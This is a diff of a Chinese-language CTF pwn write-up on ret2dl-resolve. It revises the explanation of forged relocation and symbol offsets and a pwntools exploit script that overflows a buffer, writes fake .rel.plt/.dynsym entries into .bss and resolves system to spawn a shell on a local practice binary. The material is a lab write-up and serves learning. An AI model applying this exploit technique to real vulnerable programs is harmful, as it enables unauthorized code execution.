@@ -74,7 +74,7 @@ p.interactive()
 	em
 	/bin/sh
 ```
-看到这个应该就了解了,我们的2处指向使其指向了system,但是要注意,经过本人测试,第一个数据在`0x0804a000~0x0804affc`都可完成操作,我们来看一下各个部分都是怎么来的
+看到这个应该就了解了,我们的2处指向使其指向了system,我们来看一下各个部分都是怎么来的
 
  - `0x1da8`是偏移,即bss和`.rel.plt段`(根据`objdump -s -j .rel.plt ./x86`)位置差
  - `0x1e807`根据`((欲伪造的地址-.dynsym基地址)/0x10)<<8+7`,其中`dynsym`根据`objdump -s -j .dynsym ./x86`
@@ -136,22 +136,24 @@ Contents of section .dynstr:
 
 此处为`(0x0804A040 + 8 + 24) - 0x804827c = 0x1ee4`
 
+其中`0x8048380`是`push`完第一个参数后的地址,`0x0804a00c`是`read@got`,不过经本人测试,此数据在`0x0804a000~0x0804affc`区间都可完成操作,
+
 我们来构造一下exp
 
 ```
+# coding=utf-8
 from pwn import *
 p = process('./pwn')
-context.log_level = 'debug'
+#context.log_level = 'debug'
 elf = ELF('./pwn')
 gift = 0x0804A040#bss
 
-payload = 0x28*'a' + 4*'a'
+payload = 44*'a'
 payload +=  p32(elf.plt['read']) + p32(0x804852D)#fun_addr
 payload += p32(0) + p32(gift) + p32(17*4)
 
 p.sendline(payload)
 sleep(0.5)
-
 payload = ''
 payload += p32(0x0804a00c) + p32(0x1e707)
 payload += p32(0)+p32(0x1de4)
@@ -160,10 +162,10 @@ payload += 'system\x00\x00'
 payload += '/bin/bash\x00'
 p.sendline(payload)
 sleep(0.5)
-
-payload = 0x28*'a' + 4*'a'
+payload =44*'a'
 payload += p32(0x8048380) + p32(0x1d04) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
 p.sendline(payload)
 
 p.interactive()
 ```
+最后跑起来发现,完了,咋错了,然后又试了试,成功了.又,加上了sleep后就好了,以后这种连续send的一定加sleep呀~
